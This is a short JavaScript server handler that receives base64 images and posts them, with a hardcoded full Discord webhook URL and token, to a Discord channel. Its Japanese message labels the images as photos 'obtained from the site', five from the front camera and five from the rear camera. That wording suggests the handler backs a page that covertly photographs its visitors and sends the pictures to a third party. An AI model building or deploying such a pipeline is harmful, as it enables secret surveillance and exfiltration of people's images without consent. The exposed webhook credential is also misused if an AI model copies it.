export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { images } = req.body;

    const form = new FormData();
    images.forEach((img, index) => {
      const buffer = Buffer.from(img.split(',')[1], 'base64');
      form.append(`file${index + 1}`, buffer, {
        filename: `image${index + 1}.jpg`,
        contentType: 'image/jpeg',
      });
    });

    form.append('payload_json', JSON.stringify({
      content: 'サイトから取得した写真を送信。1〜5枚目はインカメラ（内カメ）で撮影した写真、6〜10枚目はアウトカメラ（外カメ）で撮影した写真。',
    }));

    const webhookUrl = 'https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u';

    const response = await fetch(webhookUrl, {
      method: 'POST',
      body: form,
    });

    if (!response.ok) {
      throw new Error(`Discord error: ${response.statusText}`);
    }

    res.status(200).json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Upload failed' });
  }
}
